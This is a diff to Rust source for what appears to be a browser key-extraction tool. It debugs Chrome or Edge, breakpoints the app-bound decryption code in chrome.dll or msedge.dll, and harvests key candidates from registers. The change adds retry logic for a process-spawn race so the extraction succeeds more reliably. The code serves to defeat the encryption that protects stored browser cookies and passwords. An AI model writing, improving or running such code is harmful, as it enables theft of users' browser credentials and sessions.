@@ -253,12 +253,24 @@ fn locate_breakpoints(hprocess: HANDLE, base: usize) -> Vec<usize> {
     pe::find_lea_xrefs(hprocess, base, string_va)
 }
 
+/// What the debug phase produced, for the caller to decide on retries.
+pub struct DebugOutcome {
+    pub candidates: Vec<KeyCandidate>,
+    /// Whether the target module (chrome.dll / msedge.dll) was ever loaded.
+    /// A spawn that exits without ever loading it is a singleton handoff
+    /// race, not a technique failure, and is worth retrying.
+    pub saw_module: bool,
+}
+
 /// Attach as the debugger (the caller already did DebugActiveProcess) and wait
 /// for the browser to run through its own app-bound decryption. On every
 /// breakpoint hit, harvest key candidates from all registers; the true key is
 /// picked later by validating candidates against real encrypted blobs.
-pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> Vec<KeyCandidate> {
-    let mut candidates: Vec<KeyCandidate> = Vec::new();
+pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> DebugOutcome {
+    let mut outcome = DebugOutcome {
+        candidates: Vec::new(),
+        saw_module: false,
+    };
     let mut slots: Vec<usize> = Vec::new();
     let mut fired: Vec<usize> = Vec::new();
     let started = Instant::now();
@@ -312,7 +324,7 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> Vec<KeyCandidate>
                         ctx.Rax,
                         ctx.Rbx
                     );
-                    collect_candidates(hprocess, ctx, &mut candidates);
+                    collect_candidates(hprocess, ctx, &mut outcome.candidates);
 
                     // Whichever slot fired (Dr6 bits B0..B3) must be disabled
                     // on this thread, or continuing re-triggers it endlessly.
@@ -364,6 +376,7 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> Vec<KeyCandidate>
                         if name.eq_ignore_ascii_case(target_module) {
                             let base = load.lpBaseOfDll as usize;
                             crate::log_out!("[*] {target_module} loaded at {base:#x}");
+                            outcome.saw_module = true;
                             let xrefs = locate_breakpoints(hprocess, base);
                             if xrefs.is_empty() {
                                 crate::log_err!(
@@ -395,5 +408,5 @@ pub fn run(hprocess: HANDLE, pid: u32, target_module: &str) -> Vec<KeyCandidate>
         }
         unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
     }
-    candidates
+    outcome
 }
